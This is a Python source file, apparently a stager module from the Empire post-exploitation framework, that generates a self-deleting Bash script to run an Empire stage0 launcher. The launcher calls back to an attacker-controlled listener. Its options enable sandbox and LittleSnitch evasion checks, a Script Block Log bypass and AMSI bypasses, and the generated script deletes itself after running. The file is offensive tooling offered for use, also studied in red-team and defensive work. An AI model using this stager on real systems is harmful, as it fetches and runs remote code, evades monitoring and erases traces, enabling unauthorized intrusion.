from __future__ import print_function
from builtins import object
from lib.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BashScript',

            'Author': ['@harmj0y'],

            'Description': ('Generates self-deleting Bash script to execute the Empire stage0 launcher.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'OutFile' : {
                'Description'   :   'File to output Bash script to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ScriptLogBypass' : {
                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'AMSIBypass' : {
                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'AMSIBypass2' : {
                'Description'   :   'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                'Required'      :   False,
                'Value'         :   'False'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        scriptLogBypass = self.options['ScriptLogBypass']['Value']
        AMSIBypass = self.options['AMSIBypass']['Value']
        AMSIBypass2 = self.options['AMSIBypass2']['Value']

        scriptLogBypassBool = False
        if scriptLogBypass.lower() == "true":
            scriptLogBypassBool = True

        AMSIBypassBool = False
        if AMSIBypass.lower() == "true":
            AMSIBypassBool = True

        AMSIBypass2Bool = False
        if AMSIBypass2.lower() == "true":
            AMSIBypass2Bool = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        else:
            script = "#!/bin/bash\n"
            script += "%s\n" %(launcher)
            script += "rm -f \"$0\"\n"
            script += "exit\n"
            return script
